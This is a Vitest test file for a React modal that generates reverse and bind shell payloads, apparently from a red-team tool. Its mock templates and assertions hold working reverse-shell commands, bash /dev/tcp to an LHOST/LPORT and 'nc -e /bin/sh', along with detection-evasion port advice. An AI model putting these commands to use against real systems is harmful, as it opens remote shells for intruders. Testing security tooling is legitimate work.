import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { PayloadGeneratorModal } from './PayloadGeneratorModal';
import { PayloadTemplate, PayloadFileConfig, PayloadRenderOptions, PayloadRenderResult } from '../types/payload';

describe('PayloadGeneratorModal (F-33)', () => {
  const mockTemplates: PayloadTemplate[] = [
    {
      id: 'tmpl-bash-rev',
      name: 'Bash Interactive TCP',
      description: 'Standard bash reverse shell over /dev/tcp',
      os: 'linux',
      shell: 'bash',
      kind: 'reverse',
      command: 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1',
      defaultPort: 443,
      opsecRisk: 'low',
      notes: 'Requires bash on target',
      tags: ['linux', 'bash', 'reverse'],
    },
    {
      id: 'tmpl-empty-cmd',
      name: 'PowerShell Reverse Template',
      description: 'PowerShell template with empty command ready for population',
      os: 'windows',
      shell: 'powershell',
      kind: 'reverse',
      command: '',
      defaultPort: 8443,
      opsecRisk: 'medium',
      notes: 'Fill with custom command',
      tags: ['windows', 'powershell'],
    },
  ];

  const mockFileConfig: PayloadFileConfig = {
    filePath: 'data/payload_templates.json',
    templateCount: 2,
    exists: true,
    lastModified: '2026-11-13T12:00:00Z',
  };

  let listTemplatesMock: ReturnType<typeof vi.fn>;
  let saveTemplateMock: ReturnType<typeof vi.fn>;
  let deleteTemplateMock: ReturnType<typeof vi.fn>;
  let renderPayloadMock: ReturnType<typeof vi.fn>;
  let saveAsSnippetMock: ReturnType<typeof vi.fn>;
  let getFileConfigMock: ReturnType<typeof vi.fn>;
  let setFilePathMock: ReturnType<typeof vi.fn>;
  let onCloseMock: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    listTemplatesMock = vi.fn().mockResolvedValue(mockTemplates);
    saveTemplateMock = vi.fn().mockResolvedValue(undefined);
    deleteTemplateMock = vi.fn().mockResolvedValue(undefined);
    renderPayloadMock = vi.fn().mockImplementation(async (opts: PayloadRenderOptions): Promise<PayloadRenderResult> => {
      const isMetasploitPort = opts.lport === 4444;
      return {
        templateId: opts.templateId,
        rawCommand: 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1',
        rendered: `bash -i >& /dev/tcp/${opts.lhost}/${opts.lport} 0>&1`,
        encoding: opts.encoding || 'none',
        opsecWarnings: isMetasploitPort ? ['Port 4444 is a widely signatured Metasploit default'] : [],
        resolvedVars: { LHOST: opts.lhost, LPORT: String(opts.lport) },
      };
    });
    saveAsSnippetMock = vi.fn().mockResolvedValue(undefined);
    getFileConfigMock = vi.fn().mockResolvedValue(mockFileConfig);
    setFilePathMock = vi.fn().mockResolvedValue(mockFileConfig);
    onCloseMock = vi.fn();
  });

  it('renders modal header, external template file status and template list', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    expect(screen.getByText(/PAYLOAD GENERATOR \/\/ REVERSE & BIND SHELLS/i)).toBeDefined();

    await waitFor(() => {
      expect(screen.getAllByText('Bash Interactive TCP').length).toBeGreaterThan(0);
      expect(screen.getByText('PowerShell Reverse Template')).toBeDefined();
      expect(screen.getByText(/2 TEMPLATES/i)).toBeDefined();
    });
  });

  it('renders the populated command and updates when LPORT changes', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    await waitFor(() => {
      expect(renderPayloadMock).toHaveBeenCalled();
    });

    // Verify rendered payload in pre tag
    await waitFor(() => {
      expect(screen.getByText(/bash -i >& \/dev\/tcp\/10\.10\.14\.1\/443 0>&1/i)).toBeDefined();
    });

    // Click quick stealth port 80
    const port80Btn = screen.getByTitle('HTTP Egress');
    fireEvent.click(port80Btn);

    await waitFor(() => {
      expect(renderPayloadMock).toHaveBeenCalledWith(
        expect.objectContaining({
          lport: 80,
        })
      );
    });
  });

  it('shows OPSEC warning when Metasploit port 4444 is selected', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    await waitFor(() => {
      expect(screen.getAllByText('Bash Interactive TCP').length).toBeGreaterThan(0);
    });

    // Click port 4444
    const port4444Btn = screen.getByTitle(/Metasploit default/i);
    fireEvent.click(port4444Btn);

    await waitFor(() => {
      expect(screen.getByText(/OPSEC RISK NOTICE \/\/ SIGNATURE & EGRESS RESTRICTIONS/i)).toBeDefined();
      expect(screen.getByText(/Port 4444 is a widely signatured Metasploit default/i)).toBeDefined();
    });
  });

  it('shows empty command prompt when template command is blank ready for population', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    await waitFor(() => {
      expect(screen.getByText('PowerShell Reverse Template')).toBeDefined();
    });

    // Select the template with empty command
    fireEvent.click(screen.getByText('PowerShell Reverse Template'));

    await waitFor(() => {
      expect(screen.getByText(/Template Command Ready for Population/i)).toBeDefined();
      expect(screen.getByText(/Populate Template Command/i)).toBeDefined();
    });
  });

  it('allows saving rendered payload as a snippet into the vault', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    await waitFor(() => {
      expect(screen.getByText('Save as Snippet')).toBeDefined();
    });

    const saveSnippetBtn = screen.getByText('Save as Snippet');
    fireEvent.click(saveSnippetBtn);

    await waitFor(() => {
      expect(saveAsSnippetMock).toHaveBeenCalledWith(
        expect.objectContaining({
          templateId: 'tmpl-bash-rev',
        }),
        'Payload: Bash Interactive TCP'
      );
      expect(screen.getByText(/Payload saved to Vault as snippet successfully/i)).toBeDefined();
    });
  });

  it('allows creating and saving a new template to external store', async () => {
    render(
      <PayloadGeneratorModal
        onClose={onCloseMock}
        listTemplates={listTemplatesMock}
        saveTemplate={saveTemplateMock}
        deleteTemplate={deleteTemplateMock}
        renderPayload={renderPayloadMock}
        saveAsSnippet={saveAsSnippetMock}
        getFileConfig={getFileConfigMock}
        setFilePath={setFilePathMock}
      />
    );

    await waitFor(() => {
      expect(screen.getAllByText('Bash Interactive TCP').length).toBeGreaterThan(0);
    });

    // Click 'New Payload' button in list header
    const newBtn = screen.getByRole('button', { name: /New Payload/i });
    fireEvent.click(newBtn);

    expect(screen.getByText('NEW PAYLOAD TEMPLATE')).toBeDefined();

    // Fill form
    const nameInput = screen.getByPlaceholderText(/e\.g\. Bash - Dev TCP Reverse/i);
    fireEvent.change(nameInput, { target: { value: 'Python PTY Exploit' } });

    // Insert variable placeholder via button and verify textarea keeps/regains focus
    const cmdInput = screen.getByPlaceholderText(/e\.g\. bash -i >& \/dev\/tcp/i) as HTMLTextAreaElement;
    fireEvent.change(cmdInput, {
      target: { value: 'nc  443 -e /bin/sh' },
    });
    cmdInput.setSelectionRange(3, 3);
    fireEvent.click(screen.getByRole('button', { name: '{{LHOST}}' }));
    await waitFor(() => {
      expect(document.activeElement).toBe(cmdInput);
    });

    // Replace with full test payload before saving
    fireEvent.change(cmdInput, {
      target: { value: 'python3 -c \'import pty,os; pty.spawn("/bin/bash")\'' },
    });

    const saveBtn = screen.getByText('Save to External File');
    fireEvent.click(saveBtn);

    await waitFor(() => {
      expect(saveTemplateMock).toHaveBeenCalledWith(
        expect.objectContaining({
          name: 'Python PTY Exploit',
          command: 'python3 -c \'import pty,os; pty.spawn("/bin/bash")\'',
        })
      );
    });
  });
});
